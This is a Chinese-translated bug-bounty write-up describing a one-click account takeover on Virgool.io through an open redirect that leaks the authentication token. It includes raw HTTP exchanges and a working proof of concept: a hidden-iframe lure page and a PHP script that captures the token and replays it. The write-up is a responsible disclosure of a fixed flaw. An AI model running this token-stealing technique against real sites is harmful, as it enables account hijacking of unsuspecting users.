<html>
<head>
<title>1-Click Account Takeover in Virgool.io — a Nice Case Study</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Virgool.io的一键式账户接管——一个很好的案例研究</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/1-click-account-takeover-in-virgool-io-a-nice-case-study-6bfc3cb98ef2?source=collection_archive---------0-----------------------#2019-06-27">https://infosecwriteups.com/1-click-account-takeover-in-virgool-io-a-nice-case-study-6bfc3cb98ef2?source=collection_archive---------0-----------------------#2019-06-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2c46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好，<a class="ae kl" href="https://virgool.io/" rel="noopener ugc nofollow" target="_blank"> Virgool </a>是一个轻量级的，伊朗版的meduim.com，最近我在他们的产品中发现了一次点击账户接管漏洞。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/80db8e94c0f010e3fa170cc43184e401.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yb2i_pCP7qO5lUM9h_HXqA.png"/></div></div></figure><p id="a25c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Virgool为用户提供了域名停放的能力。所以<code class="fe ky kz la lb b">site.com</code>可以是<code class="fe ky kz la lb b">virgool.io/myname</code>的一面镜子。我在看Virgool上主办的<a class="ae kl" href="https://tech.cafebazaar.ir" rel="noopener ugc nofollow" target="_blank">https://tech . cafe bazaar . IR</a>。我看到了源代码，最吸引眼球的部分是登录链接:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="edd6" class="lg lh iq lb b gy li lj l lk ll"><a class="ae kl" href="https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login" rel="noopener ugc nofollow" target="_blank">https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;amp;status=login</a></span></pre><p id="c04c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我点击了一下，登录了Virgool，然后我再次被重定向到了<a class="ae kl" href="https://tech.cafebazaar.ir" rel="noopener ugc nofollow" target="_blank">https://tech . cafe bazaar . IR</a>。让我们看看流程:</p><p id="5799" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从<a class="ae kl" href="https://tech.cafebazaar.ir" rel="noopener ugc nofollow" target="_blank">https://tech . cafe bazaar . IR</a>页面点击登录:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="ee6b" class="lg lh iq lb b gy li lj l lk ll">GET /authorize?<strong class="lb ir">redirectedFrom=</strong><a class="ae kl" href="https://tech.cafebazaar.ir&amp;status=login" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">https://tech.cafebazaar.ir&amp;status=login</strong></a> HTTP/1.1<br/>Host: virgool.io<br/>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae kl" href="https://tech.cafebazaar.ir/" rel="noopener ugc nofollow" target="_blank">https://tech.cafebazaar.ir/</a><br/>Connection: close<br/>Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1<br/>Upgrade-Insecure-Requests: 1</span></pre><p id="f838" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="4fde" class="lg lh iq lb b gy li lj l lk ll">HTTP/1.1 302 Found<br/>Server: nginx/1.15.9<br/>Date: Wed, 26 Jun 2019 05:45:35 GMT<br/>Content-Type: text/html; charset=UTF-8<br/>Connection: close<br/>X-Powered-By: Virgool<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Cache-Control: no-cache, private<br/><strong class="lb ir">Location: </strong><a class="ae kl" href="https://virgool.io/login" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">https://virgool.io/login</strong></a><br/>Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/<br/>Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/; httponly<br/>X-Frame-Options: sameorigin<br/>X-Content-Type-Options: nosniff<br/>X-XSS-Protection: 1; mode=block<br/>Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> stats.vstat.ir heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>; font-src 'self' data: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a>;  img-src blob: data: https: 'self' files.virgool.io <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a>; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a> 'unsafe-eval' 'unsafe-inline' <a class="ae kl" href="http://www.googletagmanager.com" rel="noopener ugc nofollow" target="_blank">www.googletagmanager.com</a> <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a> <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a>  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; <br/>Strict-Transport-Security: max-age=15724800; includeSubDomains<br/>Content-Length: 5830</span></pre><p id="cd1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提交凭据后的登录页面:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="bfa5" class="lg lh iq lb b gy li lj l lk ll">POST /api/v1.2/login HTTP/1.1<br/>Host: virgool.io<br/>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0<br/>Accept: application/json, text/plain, */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae kl" href="https://virgool.io/login" rel="noopener ugc nofollow" target="_blank">https://virgool.io/login</a><br/>X-XSRF-TOKEN: REDUCTED<br/>Content-Type: multipart/form-data; boundary=---------------------------1803676204095613341172964359<br/>Content-Length: 319<br/>Connection: close<br/>Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED%3D%3D; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1</span><span id="0379" class="lg lh iq lb b gy lm lj l lk ll">-----------------------------1803676204095613341172964359<br/>Content-Disposition: form-data; name="username"</span><span id="4f18" class="lg lh iq lb b gy lm lj l lk ll"><a class="ae kl" href="mailto:y.shahinzadeh@gmail.com" rel="noopener ugc nofollow" target="_blank">y.shahinzadeh@gmail.com</a><br/>-----------------------------1803676204095613341172964359<br/>Content-Disposition: form-data; name="password"</span><span id="9eb4" class="lg lh iq lb b gy lm lj l lk ll">REDUCTED<br/>-----------------------------1803676204095613341172964359--</span></pre><p id="05bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="d0a9" class="lg lh iq lb b gy li lj l lk ll">HTTP/1.1 200 OK<br/>Server: nginx/1.15.9<br/>Date: Wed, 26 Jun 2019 05:45:55 GMT<br/>Content-Type: application/json<br/>Connection: close<br/>Vary: Accept-Encoding<br/>X-Powered-By: Virgool<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Cache-Control: no-cache, private<br/>X-RateLimit-Limit: 1000<br/>X-RateLimit-Remaining: 861<br/>Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/<br/>Set-Cookie: jwts=REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/; secure; httponly<br/>Set-Cookie: refreshed_token=REDUCTED; expires=Wed, 26-Jun-2019 06:05:55 GMT; Max-Age=1200; path=/; secure<br/>Set-Cookie: uid=sb5uevdkih3r; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/<br/>Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:55 GMT; Max-Age=86400; path=/; httponly<br/>X-Frame-Options: sameorigin<br/>X-Content-Type-Options: nosniff<br/>X-XSS-Protection: 1; mode=block<br/>Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> stats.vstat.ir heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>; font-src 'self' data: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a>;  img-src blob: data: https: 'self' files.virgool.io <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a>; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a> 'unsafe-eval' 'unsafe-inline' <a class="ae kl" href="http://www.googletagmanager.com" rel="noopener ugc nofollow" target="_blank">www.googletagmanager.com</a> <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a> <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a>  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; <br/>Strict-Transport-Security: max-age=15724800; includeSubDomains<br/>Content-Length: 612</span><span id="e963" class="lg lh iq lb b gy lm lj l lk ll">{"success":true,"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED.juAVldUazb6ZTMCopRaXzWQGh-6EYnxXjUd8uEK5jDA","previous_url":"<strong class="lb ir">https:\/\/virgool.io\/authorize?redirectedFrom=https:\/\/tech.cafebazaar.ir&amp;status=checked</strong>","user":{"name":"YShahinzadeh","activated":1,"username":"YShahinzadeh","avatar":"https:\/\/files.virgool.io\/upload\/users\/9091\/avatar\/1xRXC6.png"}}</span></pre><p id="2090" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没什么有用的。操纵登录链接的想法(<a class="ae kl" href="https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login" rel="noopener ugc nofollow" target="_blank">https://virgool.io/authorize?redirected from = https://tech . cafe bazaar . IR&amp;amp；status=login </a>)不够有趣，因为:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="190c" class="lg lh iq lb b gy li lj l lk ll"><a class="ae kl" href="https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login" rel="noopener ugc nofollow" target="_blank">https://virgool.io/authorize?redirectedFrom=https://test.com&amp;status=login</a></span></pre><p id="6a48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用户登录后会有一个无用的打开重定向(老实说我没查过这个向量，我不确定登录顺序后的打开重定向)。这里我测试了一个攻击场景:</p><blockquote class="ln lo lp"><p id="150e" class="jn jo lq jp b jq jr js jt ju jv jw jx lr jz ka kb ls kd ke kf lt kh ki kj kk ij bi translated">如果用户已经登录，点击授权链接会怎样？</p></blockquote><p id="ca84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其机制是:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="4a4b" class="lg lh iq lb b gy li lj l lk ll">GET /authorize?redirectedFrom=<a class="ae kl" href="http://tech.cafebazaar.ir&amp;status=login" rel="noopener ugc nofollow" target="_blank">http://tech.cafebazaar.ir&amp;status=login</a> HTTP/1.1<br/>Host: virgool.io<br/>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Connection: close<br/>Cookie: REDUCTED<br/>Upgrade-Insecure-Requests: 1</span></pre><p id="86e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反应令人惊讶:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="2e7c" class="lg lh iq lb b gy li lj l lk ll">HTTP/1.1 302 Found<br/>Server: nginx/1.15.9<br/>Date: Wed, 26 Jun 2019 08:34:53 GMT<br/>Content-Type: text/html; charset=UTF-8<br/>Connection: close<br/>X-Powered-By: Virgool<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Cache-Control: no-cache, private<br/><strong class="lb ir">Location: </strong><a class="ae kl" href="http://tech.cafebazaar.ir/authorize-token?token=sb5uevdkih3r&amp;redirectedFrom=http://tech.cafebazaar.ir&amp;nightmode={" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">http://tech.cafebazaar.ir/authorize-token?token=sa5uevekit3r&amp;redirectedFrom=http://tech.cafebazaar.ir&amp;nightmode={</strong></a><strong class="lb ir">"value":0,"userMenu":0,"active":0}</strong><br/>Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/<br/>Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/; httponly<br/>X-Frame-Options: sameorigin<br/>X-Content-Type-Options: nosniff<br/>X-XSS-Protection: 1; mode=block<br/>Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> stats.vstat.ir heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>; font-src 'self' data: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a>;  img-src blob: data: https: 'self' files.virgool.io <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a>; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: <a class="ae kl" href="https://virgool.io" rel="noopener ugc nofollow" target="_blank">https://virgool.io</a> 'unsafe-eval' 'unsafe-inline' <a class="ae kl" href="http://www.googletagmanager.com" rel="noopener ugc nofollow" target="_blank">www.googletagmanager.com</a> <a class="ae kl" href="https://www.google-analytics.com" rel="noopener ugc nofollow" target="_blank">https://www.google-analytics.com</a> js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a> <a class="ae kl" href="https://geoip-db.com" rel="noopener ugc nofollow" target="_blank">https://geoip-db.com</a>  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly <a class="ae kl" href="https://cdn.iframe.ly" rel="noopener ugc nofollow" target="_blank">https://cdn.iframe.ly</a>  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; <br/>Strict-Transport-Security: max-age=15724800; includeSubDomains<br/>Content-Length: 6482</span></pre><p id="24b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等等，没有任何登录页面，只有一个令牌来刷新身份验证(更新JWT令牌)。如果我能偷到代币，我会接管任何账户。怎么可能呢？通过开放重定向:)</p><p id="a54a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一枪成功了:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="d4f9" class="lg lh iq lb b gy li lj l lk ll">GET /authorize?redirectedFrom=<a class="ae kl" href="http://localhost/&amp;status=login" rel="noopener ugc nofollow" target="_blank">http://localhost/&amp;status=login</a> HTTP/1.1<br/>Host: virgool.io<br/>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Connection: close<br/>...</span></pre><p id="7e5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="b31c" class="lg lh iq lb b gy li lj l lk ll">HTTP/1.1 302 Found<br/>Server: nginx/1.15.9<br/>Date: Wed, 26 Jun 2019 08:42:40 GMT<br/>Content-Type: text/html; charset=UTF-8<br/>Connection: close<br/>X-Powered-By: Virgool<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Cache-Control: no-cache, private<br/><strong class="lb ir">Location: </strong><a class="ae kl" href="http://localhost/authorize-token?token=sb5uevdkih3r&amp;redirectedFrom=http://localhost/&amp;nightmode={" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">http://localhost/authorize-token?token=sb5uevdkih3r&amp;redirectedFrom=http://localhost/&amp;nightmode={</strong></a><strong class="lb ir">"value":0,"userMenu":0,"active":0}</strong><br/>...</span></pre><p id="39e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成，1-lick帐户接管。以下是漏洞利用代码:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="1580" class="lg lh iq lb b gy li lj l lk ll">&lt;style&gt;<br/>iframe {<br/>    visibility: hidden;<br/>    position: absolute;<br/>    left: 0; top: 0;<br/>    height:0; width:0;<br/>    border: none;<br/>}</span><span id="d72a" class="lg lh iq lb b gy lm lj l lk ll">&lt;/style&gt;</span><span id="38a2" class="lg lh iq lb b gy lm lj l lk ll">&lt;center&gt;&lt;img src="troll.jpg"&gt;&lt;/center&gt;&lt;iframe src="<a class="ae kl" href="https://virgool.io/authorize?redirectedFrom=http://localhost/v/g.php&amp;status=login" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">https://virgool.io/authorize?redirectedFrom=http://localhost/v/g.php&amp;status=login</strong></a>"&gt;&lt;/iframe&gt;</span></pre><p id="e62f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在攻击者的盒子里:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="c54e" class="lg lh iq lb b gy li lj l lk ll">&lt;?php</span><span id="30b3" class="lg lh iq lb b gy lm lj l lk ll">file_put_contents('hacked.html', '&lt;html&gt;&lt;meta content="text/html;charset=utf-8" http-equiv="Content-Type"&gt;<br/>&lt;meta content="utf-8" http-equiv="encoding"&gt;&lt;script&gt;document.location=\'<a class="ae kl" href="http://virgool.io/authorize-token?token='" rel="noopener ugc nofollow" target="_blank">http://virgool.io/authorize-token?token='</a> . $_GET['token'] . '&amp;redirectedFrom=<a class="ae kl" href="https://virgool.io&amp;nightmode={" rel="noopener ugc nofollow" target="_blank">https://virgool.io&amp;nightmode={</a>"value":0,"userMenu":0,"active":0}\'&lt;/script&gt;');</span><span id="9a30" class="lg lh iq lb b gy lm lj l lk ll">?&gt;</span></pre><p id="ca04" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦用户访问了攻击者的网站，攻击者应该诱骗用户访问他们的网站:</p><pre class="kn ko kp kq gt lc lb ld le aw lf bi"><span id="6ebc" class="lg lh iq lb b gy li lj l lk ll"><strong class="lb ir">GET /authorize-token?token=</strong><a class="ae kl" href="http://tech.cafebazaar.ir/authorize-token?token=sb5uevdkih3r&amp;redirectedFrom=http://tech.cafebazaar.ir&amp;nightmode={" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">sa5uevekit3r</strong></a><strong class="lb ir">&amp;redirectedFrom=</strong><a class="ae kl" href="http://localhost/v/g.php&amp;nightmode={%22value%22:0,%22userMenu%22:0,%22active%22:0" rel="noopener ugc nofollow" target="_blank"><strong class="lb ir">http://localhost/v/g.php&amp;nightmode={%22value%22:0,%22userMenu%22:0,%22active%22:0</strong></a><strong class="lb ir">}</strong> HTTP/1.1<br/><strong class="lb ir">Host: localhost</strong><br/>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Connection: close<br/>Referer: <a class="ae kl" href="http://localhost/v/" rel="noopener ugc nofollow" target="_blank">http://localhost/v/</a><br/>Upgrade-Insecure-Requests: 1<br/>Pragma: no-cache<br/>Cache-Control: no-cache</span></pre><p id="eed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们将令牌发送给攻击者，他们的Virgool帐户就被攻破了。在这里，我应该感谢Virgool的快速反应和慷慨。以下是发送给Virgool的POC视频:</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="lu lv l"/></div></figure></div></div>    
</body>
</html>